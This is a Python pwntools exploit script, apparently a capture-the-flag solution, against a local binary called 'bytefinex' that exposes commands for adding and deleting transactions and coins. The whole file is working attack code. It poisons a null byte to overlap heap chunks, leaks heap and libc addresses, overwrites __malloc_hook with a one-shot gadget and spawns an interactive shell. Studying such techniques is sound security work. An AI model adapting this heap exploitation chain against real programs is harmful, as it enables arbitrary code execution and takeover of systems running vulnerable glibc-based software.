from pwn import *

def addt(data):
	r.sendlineafter('# ', 'addt ' + data)
	return

def addc(data):
	r.sendlineafter('# ', 'addc ' + data)
	return

def chgt(hash, data):
	r.sendlineafter('# ', 'chgt ' + hash + ' ' + data)
	return

def chgc(hash, data):
	r.sendlineafter('# ', 'chgc ' + hash + ' ' + data)
	return

def showt(which_one):
	r.sendlineafter('# ', 'showt')
	for i in xrange(which_one + 1):
		r.recvuntil('TRANSACTION ID -> ')
	return r.recvline().strip()

def showc(which_one):
	r.sendlineafter('# ', 'showc')
	for i in xrange(which_one + 1):
		r.recvuntil('COIN ID = ')
	return r.recvline().strip()

def delt(hash):
	r.sendlineafter('# ', 'delt ' + hash)
	return

def delc(hash):
	r.sendlineafter('# ', 'delc ' + hash)
	return

# Return the ID of the desired transaction
def transaction(idx):
	return showt(idx)

# Returns the ID of the desired coin
def coin(idx):
	return showc(idx)

# Used for both libc and heap leaks
def leak(idx):
	showt(idx)
	r.recvuntil('LABEL          -> ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	addc('C'*0x30) # coin 0
	addt('T'*0x88) # transaction 0
	addt('T'*0x38) # transaction 1
	addt('T'*0x80) # transaction 2

	# create free fast chunk to consolidate afterwards
	delc(coin(0))
	# consolidate fastchunks
	delt(transaction(2))

	addt('T'*0xf0) # transaction 2
	# wall chunk to prevent consolidation with top chunk
	# during backward consolidation
	addc('C'*0x60) # coin 1

	# delete transaction 1 and request it back, but this time null poison
	delt(transaction(1))

	# Make transaction 2 think that the previous chunk is transaction 0
	addt('T'*0x30 + p64(0x210)) # transaction 3
	
	delt(transaction(0))
	# Trigger overlap and consolidation 
	delt(transaction(1))

	# At this point there is an unsorted chunk at the base of the heap
	# We can use that to overlap an unsorted chunk (which will contain libc pointers pointing to the heap)
	# with an already in-use chunk (transaction 0) and then print its name pointer to get our heap leak
	data  = 'A'*0x120
	# don't corrupt the chunk's metadata
	data += p64(0x130)
	data += p64(0xa0)
	# amount of bytes to r/w
	data += p32(12)
	# we don't care
	data += p32(0x41)
	data += p64(0xb00bface)*14

	addt(data)

	heap = leak(0) - 0x480
	log.success('Heap: 0x{:x}'.format(heap))

	# At this point the remainder chunk overlaps with transaction 0's
	# name pointer. If we delete a coin and request one back, we can overwrite
	# the data pointer with the heap address of the remainder chunk which will contain
	# main arena pointers
	delc(coin(0))

	# Overwrite the data pointer with the remainder chunk
	# Add 'kek' to avoid triggering realloc
	addc(p64(0x1337) + p64(heap + 0x280) + 'kek') # coin 0

	libc          = leak(0) - 0x3c4b78
	magic         = libc + 0xf1147
	__malloc_hook = libc + 0x3c4b10
	log.success('Libc: 0x{:x}'.format(libc))

	# Now that we have control over the name pointer of transaction 0,
	# we can call chgc() in order to overwrite it with __malloc_hook
	# and pop a shell

	# transaction_0->name => __malloc_hook
	chgc(coin(0), p64(0xb00bface) + p64(__malloc_hook))
	# __malloc_hook => one shot gadget
	chgt(transaction(0), p64(magic))

	# trigger one shot gadget
	addc('pwned')

	r.interactive()

if __name__ == "__main__":
	r = process('./bytefinex')
	pause()
	pwn()
